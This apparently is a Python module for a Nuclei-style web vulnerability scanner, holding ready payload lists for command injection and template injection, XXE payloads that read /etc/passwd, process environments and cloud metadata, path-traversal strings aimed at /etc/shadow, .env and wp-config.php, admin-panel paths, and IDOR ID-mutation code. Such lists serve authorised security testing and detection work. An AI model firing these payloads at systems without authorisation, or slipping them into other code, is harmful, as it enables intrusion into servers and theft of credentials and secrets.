"""Nuclei template patterns — RCE, XXE, Path Traversal, BAC, IDOR tespiti."""

# Nuclei: generic command injection (safe echo markers)
RCE_PAYLOADS = [
    "; echo VEXRCEMARKER",
    "| echo VEXRCEMARKER",
    "|| echo VEXRCEMARKER",
    "& echo VEXRCEMARKER",
    "&& echo VEXRCEMARKER",
    "`echo VEXRCEMARKER`",
    "$(echo VEXRCEMARKER)",
    "; echo VEXRCEMARKER #",
    "| echo VEXRCEMARKER #",
    "|| echo VEXRCEMARKER #",
    "& echo VEXRCEMARKER #",
    "&& echo VEXRCEMARKER #",
    ";echo VEXRCEMARKER;",
    "|echo VEXRCEMARKER|",
    "`echo VEXRCEMARKER`",
    "$(echo VEXRCEMARKER)",
    "\necho VEXRCEMARKER",
    "\r\necho VEXRCEMARKER",
    "'; echo VEXRCEMARKER; '",
    "\"; echo VEXRCEMARKER; \"",
    "';echo VEXRCEMARKER;'",
    "\";echo VEXRCEMARKER;\"",
    "1; echo VEXRCEMARKER",
    "1 | echo VEXRCEMARKER",
    "1 || echo VEXRCEMARKER",
    "1 && echo VEXRCEMARKER",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{7*'7'}}",
    "{{config}}",
    "{{self.__init__.__globals__}}",
    "{{request.application.__globals__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "@(7*7)",
    "${{7*7}}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "#{7*7}",
    "*{7*7}",
    "{{constructor.constructor('return process')()}}",
    "; id",
    "| id",
    "|| id",
    "&& id",
    "; whoami",
    "| whoami",
    "|| whoami",
    "&& whoami",
    "; uname -a",
    "| uname -a",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; type C:\\Windows\\win.ini",
    "| type C:\\Windows\\win.ini",
    "`id`",
    "$(id)",
    "$(whoami)",
    "`whoami`",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
    "& ping -n 1 127.0.0.1",
    "; ping -n 1 127.0.0.1",
]

RCE_INDICATORS = [
    "VEXRCEMARKER",
    "uid=",
    "gid=",
    "groups=",
    "root:x:0:0:",
    "www-data",
    "Linux",
    "Darwin",
    "Windows",
    "49",  # {{7*7}} SSTI
    "7777777",
]

# Nuclei: XXE patterns
XXE_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY a SYSTEM "file:///etc/passwd">]><data>&a;</data>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/passwd'>">%eval;]><foo>&exfil;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]><userInfo><name>&ent;</name></userInfo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
]

XXE_INDICATORS = [
    "root:x:0:0:",
    "[extensions]",
    "for 16-bit app support",
    "daemon:",
    "bin:",
    "127.0.0.1",
    "localhost",
    "meta-data",
    "ami-id",
    "uid=",
    "Linux version",
    "PATH=",
    "HOME=",
]

# Nuclei: path traversal / LFI
TRAVERSAL_FILES = [
    "/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/shadow", "/etc/group",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status", "/proc/version",
    "/proc/cpuinfo", "/proc/meminfo", "/proc/net/arp", "/proc/net/tcp",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/windows/win.ini", "/windows/system32/drivers/etc/hosts",
    "c:/windows/win.ini", "c:/windows/system32/drivers/etc/hosts",
    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/etc/mysql/my.cnf",
    "/.env", "/config/database.yml", "/wp-config.php", "/WEB-INF/web.xml",
]

TRAVERSAL_PREFIXES = [
    "../", "..\\", "..../", "....\\", "..%2f", "..%5c", "%2e%2e%2f", "%2e%2e%5c",
    "..%252f", "..%255c", "..%c0%af", "..%c1%9c", "..%u2216", "..%u2215",
    "..//", "..\\\\", ".%2e/", "%2e./", "..././", "...\\.\\",
    "/%5c%2e%2e/", "/%2e%2e%2f", "/..%2f..%2f", "/..%5c..%5c",
    "..%00/", "..%0d/", "..%0a/",
]

def gen_path_traversal_payloads():
    seen = set()
    for prefix in TRAVERSAL_PREFIXES:
        for depth in range(1, 9):
            traversal = prefix * depth
            for target in TRAVERSAL_FILES:
                for payload in [traversal + target, traversal + target.lstrip('/'), target]:
                    if payload not in seen:
                        seen.add(payload)
                        yield payload

PATH_INDICATORS = [
    "root:x:0:0:", "daemon:", "bin:", "sys:", "www-data:", "nobody:",
    "[extensions]", "for 16-bit app support", "[fonts]", "[Mail]",
    "127.0.0.1", "localhost", "DB_PASSWORD", "DB_HOST", "APP_KEY",
    "SECRET_KEY", "mysql:", "postgresql:", "redis:", "mongodb:",
    "Linux version", "processor", "MemTotal", "PATH=", "HOME=",
    "<?php", "define(", "web.xml", "servlet",
]

# Nuclei: BAC / exposed admin panels
BAC_PATHS = [
    "/admin", "/administrator", "/admin.php", "/admin/login", "/admin/dashboard",
    "/admin/index.php", "/admin/home", "/admin/controlpanel", "/admin/cp",
    "/panel", "/dashboard", "/manage", "/management", "/manager", "/backend",
    "/control", "/controlpanel", "/cpanel", "/webadmin", "/adminarea",
    "/admin-panel", "/admin_panel", "/admincp", "/admin/login.php",
    "/wp-admin", "/wp-login.php", "/wp-admin/admin.php",
    "/phpmyadmin", "/pma", "/mysql", "/adminer", "/adminer.php",
    "/server-status", "/server-info", "/.env", "/config", "/settings",
    "/api/admin", "/api/v1/admin", "/api/users", "/api/internal",
    "/internal", "/private", "/secret", "/debug", "/trace", "/actuator",
    "/actuator/env", "/actuator/health", "/actuator/mappings", "/swagger",
    "/swagger-ui", "/swagger-ui.html", "/api-docs", "/graphql", "/graphiql",
    "/console", "/jmx-console", "/web-console", "/invoker/JMXInvokerServlet",
    "/_admin", "/_dashboard", "/superadmin", "/sysadmin", "/root",
    "/user/admin", "/users/admin", "/account/admin", "/staff", "/moderator",
    "/administrator/index.php", "/administrator/login.php",
    "/administrator/admin.php", "/administrator/account.php",
    "/administrator/admin.asp", "/administrator/admin.html",
    "/administrator/login.asp", "/administrator/login.html",
    "/administrator/account.html", "/administrator/account.asp",
    "/admin1", "/admin2", "/admin3", "/admin4", "/admin5",
    "/moderator/admin", "/moderator/login", "/moderator/admin.php",
    "/moderator/login.php", "/moderator/admin.html", "/moderator/login.html",
    "/moderator/admin.asp", "/moderator/login.asp",
    "/modelsearch/login", "/moderator.php", "/moderator.html", "/moderator.asp",
    "/accountant", "/demo", "/demo/admin", "/demo/login",
    "/adm", "/administration", "/administration/login",
    "/administration/admin", "/administration/account",
    "/administration/login.php", "/administration/admin.php",
    "/administration/account.php", "/administration/login.html",
    "/administration/admin.html", "/administration/account.html",
    "/administration/login.asp", "/administration/admin.asp",
    "/administration/account.asp", "/administration/login.aspx",
    "/administration/admin.aspx", "/administration/account.aspx",
]

BAC_KEYWORDS = [
    "dashboard", "admin panel", "control panel", "administration",
    "logout", "sign out", "manage users", "user management",
    "settings", "configuration", "system settings", "administrator",
    "welcome admin", "admin area", "backend", "management console",
    "phpmyadmin", "database admin", "server status", "actuator",
    "swagger", "api documentation", "graphql playground",
]

BAC_SENSITIVE_HEADERS = ["x-admin", "x-debug", "x-powered-by"]

# Nuclei: IDOR patterns
IDOR_PARAM_HINTS = [
    'id', 'uid', 'user_id', 'userid', 'user', 'account', 'account_id',
    'accountid', 'profile', 'profile_id', 'order', 'order_id', 'orderid',
    'invoice', 'invoice_id', 'doc', 'doc_id', 'document', 'document_id',
    'file', 'file_id', 'fileid', 'record', 'record_id', 'item', 'item_id',
    'product', 'product_id', 'post', 'post_id', 'comment', 'comment_id',
    'message', 'message_id', 'ticket', 'ticket_id', 'report', 'report_id',
    'ref', 'reference', 'num', 'number', 'no', 'seq', 'sequence',
    'uuid', 'guid', 'token', 'key', 'hash', 'slug', 'name',
]

IDOR_PATTERNS = [
    r'^\d+$',
    r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
    r'^user\d+$',
    r'^account\d+$',
    r'^order\d+$',
    r'^[A-Za-z0-9]{8,32}$',
]

def idor_test_values(original):
    """Nuclei-style sequential ID mutation."""
    values = []
    s = str(original)
    if s.isdigit():
        n = int(s)
        values.extend([n - 2, n - 1, n + 1, n + 2, 1, 0, 99999, n ^ 1])
    elif s.startswith('user') and s[4:].isdigit():
        values.append(f"user{int(s[4:]) + 1}")
        values.append(f"user{int(s[4:]) - 1}")
    elif s.startswith('order') and s[5:].isdigit():
        values.append(f"order{int(s[5:]) + 1}")
    elif len(s) == 36 and '-' in s:
        parts = s.split('-')
        try:
            last = int(parts[-1], 16)
            parts[-1] = format((last + 1) & 0xffffffff, '012x')[-12:]
            values.append('-'.join(parts))
        except ValueError:
            pass
    return [str(v) for v in values if str(v) != s]
